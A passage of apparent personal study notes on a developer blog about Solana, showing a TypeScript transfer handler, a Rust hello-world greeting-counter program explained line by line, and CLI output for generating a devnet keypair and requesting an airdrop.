class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>secret <span class=\"token keyword\">as</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> instructions <span class=\"token operator\">=</span> SystemProgram<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      fromPubkey<span class=\"token punctuation\">,</span>\n      toPubkey<span class=\"token punctuation\">,</span>\n      lamports<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> signers <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n      <span class=\"token punctuation\">{</span>\n        publicKey<span class=\"token operator\">:</span> fromPubkey<span class=\"token punctuation\">,</span>\n        secretKey<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> transaction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>instructions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">sendAndConfirmTransaction</span><span class=\"token punctuation\">(</span>\n      connection<span class=\"token punctuation\">,</span>\n      transaction<span class=\"token punctuation\">,</span>\n      signers<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"systemprogram\" style=\"position:relative;\"><a href=\"#systemprogram\" aria-label=\"systemprogram permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SystemProgram</h2>\n<ul>\n<li>solana-web3.js</li>\n<li>Factory class for transaxtions to interact with the system program</li>\n</ul>\n<h2 id=\"systemprogramtransfer\" style=\"position:relative;\"><a href=\"#systemprogramtransfer\" aria-label=\"systemprogramtransfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SystemProgram.transfer</h2>\n<ul>\n<li>generate a transaction instruction</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> instructions <span class=\"token operator\">=</span> SystemProgram<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      fromPubkey<span class=\"token punctuation\">,</span>\n      toPubkey<span class=\"token punctuation\">,</span>\n      lamports<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>generate signers object (array’s in pub key, priv key)</p>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\">    <span class=\"token keyword\">const</span> signers <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n      <span class=\"token punctuation\">{</span>\n        publicKey<span class=\"token operator\">:</span> fromPubkey<span class=\"token punctuation\">,</span>\n        secretKey<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n</code></pre></div>\n<p>transaction instance (generate, add, …)</p>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> transaction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>instructions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>add in transaction factory instance</li>\n</ul>\n<h2 id=\"send\" style=\"position:relative;\"><a href=\"#send\" aria-label=\"send permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>send</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">sendAndConfirmTransaction</span><span class=\"token punctuation\">(</span>\n      connection<span class=\"token punctuation\">,</span>\n      transaction<span class=\"token punctuation\">,</span>\n      signers<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><a href=\"https://explorer.solana.com/tx/Zy6ziQodp85pr12pYV9e8fAKdc9jc76j7oENMujR8XHpoycH7FJ55jkngFqb38gzBC73yq7tgK83wGqDETDXrAp?cluster=devnet\">Solana TX</a></p>\n<h2 id=\"program-deploy-with-simple-contract-librs\" style=\"position:relative;\"><a href=\"#program-deploy-with-simple-contract-librs\" aria-label=\"program deploy with simple contract librs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>program deploy (with simple Contract lib.rs)</h2>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">solana_program<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">{</span>\n    <span class=\"token namespace\">account_info<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">{</span>next_account_info<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AccountInfo</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    entrypoint<span class=\"token punctuation\">,</span>\n    <span class=\"token namespace\">entrypoint<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">ProgramResult</span><span class=\"token punctuation\">,</span>\n    msg<span class=\"token punctuation\">,</span>\n    <span class=\"token namespace\">program_error<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">ProgramError</span><span class=\"token punctuation\">,</span>\n    <span class=\"token namespace\">pubkey<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Pubkey</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>borsh</li>\n<li>Binary Object Representation Serializer for Hashing</li>\n<li>crate, solana_program</li>\n<li>account_info</li>\n<li>entrypoint</li>\n<li>ProgramResult</li>\n<li>msg</li>\n<li>logging</li>\n<li>program_error</li>\n<li>ProgramError</li>\n<li>On-Chain Program Specifiy Error return (Solana Runtime)</li>\n<li>pubkey</li>\n<li>Pubkey</li>\n</ul>\n<h2 id=\"greetingaccount-struct\" style=\"position:relative;\"><a href=\"#greetingaccount-struct\" aria-label=\"greetingaccount struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GreetingAccount Struct</h2>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token attribute attr-name\">#[derive(BorshSerialize, BorshDeserialize, Debug)]</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">GreetingAccount</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">pub</span> counter<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>derive macro is Compile-time useful BorshSerialze, BorshDeserialize, Debug</li>\n<li>Struct Member</li>\n<li>counter : u32</li>\n</ul>\n<h2 id=\"program-entrypointer-settings\" style=\"position:relative;\"><a href=\"#program-entrypointer-settings\" aria-label=\"program entrypointer settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Program EntryPointer Settings</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">// Declare and export the program's entrypoint\nentrypoint!(process_instruction);</code></pre></div>\n<ul>\n<li>program run-time entrypoiter settings ⇒ fuction pointer call</li>\n</ul>\n<h2 id=\"process_instruction\" style=\"position:relative;\"><a href=\"#process_instruction\" aria-label=\"process_instruction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>process_instruction</h2>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token comment\">// Program entrypoint's implementation</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">process_instruction</span><span class=\"token punctuation\">(</span>\n    program_id<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">Pubkey</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// Public key of the account the hello world program was loaded into</span>\n    accounts<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">AccountInfo</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// The account to say hello to</span>\n    _instruction_data<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// Ignored, all helloworld instructions are hellos</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">ProgramResult</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">msg!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World Rust program entrypoint\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Iterating accounts is safer than indexing</span>\n    <span class=\"token keyword\">let</span> accounts_iter <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> accounts<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Get the account to say hello to</span>\n    <span class=\"token keyword\">let</span> account <span class=\"token operator\">=</span> <span class=\"token function\">next_account_info</span><span class=\"token punctuation\">(</span>accounts_iter<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// The account must be owned by the program in order to modify its data</span>\n    <span class=\"token keyword\">if</span> account<span class=\"token punctuation\">.</span>owner <span class=\"token operator\">!=</span> program_id <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">msg!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greeted account does not have the correct program id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ProgramError</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">IncorrectProgramId</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Increment and store the number of times the account has been greeted</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> greeting_account <span class=\"token operator\">=</span> <span class=\"token class-name\">GreetingAccount</span><span class=\"token punctuation\">::</span><span class=\"token function\">try_from_slice</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>account<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    greeting_account<span class=\"token punctuation\">.</span>counter <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    greeting_account<span class=\"token punctuation\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> account<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">borrow_mut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">msg!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greeted {} time(s)!\"</span><span class=\"token punctuation\">,</span> greeting_account<span class=\"token punctuation\">.</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>entrypoint’s implementation</li>\n<li>retrun value ⇒ process_instruction entrypoint (ProgramResult {})</li>\n<li>parms</li>\n</ul>\n<h2 id=\"program_id-pubkey\" style=\"position:relative;\"><a href=\"#program_id-pubkey\" aria-label=\"program_id pubkey permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>program_id: &#x26;Pubkey,</h2>\n<ul>\n<li>refrence ← Account Pubkey</li>\n</ul>\n<h2 id=\"accounts-accountinfo\" style=\"position:relative;\"><a href=\"#accounts-accountinfo\" aria-label=\"accounts accountinfo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>accounts: &#x26;[AccountInfo],</h2>\n<ul>\n<li>Iterator Refrence (accoutns_iter)</li>\n<li>next_account_info(account_iter)? ⇒ AccountInfo or NotEnoughAccountKeys error</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token comment\">// Iterating accounts is safer than indexing</span>\n    <span class=\"token keyword\">let</span> accounts_iter <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> accounts<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Get the account to say hello to</span>\n    <span class=\"token keyword\">let</span> account <span class=\"token operator\">=</span> <span class=\"token function\">next_account_info</span><span class=\"token punctuation\">(</span>accounts_iter<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>instructiondata: &#x26;[u8],</p>\n<ul>\n<li>iterator Refrence</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token comment\">// The account must be owned by the program in order to modify its data</span>\n<span class=\"token keyword\">if</span> account<span class=\"token punctuation\">.</span>owner <span class=\"token operator\">!=</span> program_id <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">msg!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greeted account does not have the correct program id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ProgramError</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">IncorrectProgramId</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>accounts.owner check</li>\n<li>public key does not equal the program_id</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"rust\"><pre class=\"language-rust\"><code class=\"language-rust\"><span class=\"token comment\">// Increment and store the number of times the account has been greeted</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> greeting_account <span class=\"token operator\">=</span> <span class=\"token class-name\">GreetingAccount</span><span class=\"token punctuation\">::</span><span class=\"token function\">try_from_slice</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>account<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    greeting_account<span class=\"token punctuation\">.</span>counter <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    greeting_account<span class=\"token punctuation\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> account<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">borrow_mut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">msg!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greeted {} time(s)!\"</span><span class=\"token punctuation\">,</span> greeting_account<span class=\"token punctuation\">.</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>GreetingAccount Struct ⇒ Field : counter: u32\\</li>\n<li>&#x26;account.data.borrow() ⇒ Ref ⇒ try_from_slice</li>\n<li>Deserialized and slice (byte)</li>\n<li>BorshDeserialize ⇒ try_from_slice() ⇒ account.data (mut Ref)</li>\n<li>serialize(&#x26;mut &#x26;mut account.data.borrow_mut()[..])?</li>\n<li>mutable borrow ⇒ account.data ⇒ all data</li>\n<li>&#x26;mut</li>\n<li>&#x26;mut ⇒ Serialize</li>\n</ul>\n<h2 id=\"solana-cli-air-drop-pub-keypair\" style=\"position:relative;\"><a href=\"#solana-cli-air-drop-pub-keypair\" aria-label=\"solana cli air drop pub keypair permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solana cli (air drop, pub keypair)</h2>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">☁  app [main] ⚡  solana-keygen new --outfile solana-wallet/keypair.json\nGenerating a new keypair\n\nFor added security, enter a BIP39 passphrase\n\nNOTE! This passphrase improves security of the recovery seed phrase NOT the\nkeypair file itself, which is stored as insecure plain text\n\nBIP39 Passphrase (empty for none):\n\nWrote new keypair to solana-wallet/keypair.json\n=====================================================================\npubkey: &lt;PUB-KEY&gt;\n=====================================================================\nSave this seed phrase and your BIP39 passphrase to recover your new keypair:\njelly panel immense gadget task cat ship paper knock gap prevent just\n=====================================================================\n☁  app [main] ⚡  solana airdrop 1 $(solana-keygen pubkey solana-wallet/keypair.json)\nRequesting airdrop of 1 SOL\n\nSignature: &lt;Signature&gt;</code></pre></div>\n<h2 id=\"deploy-a-solana-program\" style=\"position:relative;\"><a href=\"#deploy-a-solana-program\" aria-label=\"deploy a solana program permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploy a Solana Program</h2>\n<h3 id=\"building-the-program\" style=\"position:relative;\"><a href=\"#building-the-program\" aria-label=\"building the program permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Building the program</h3>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code 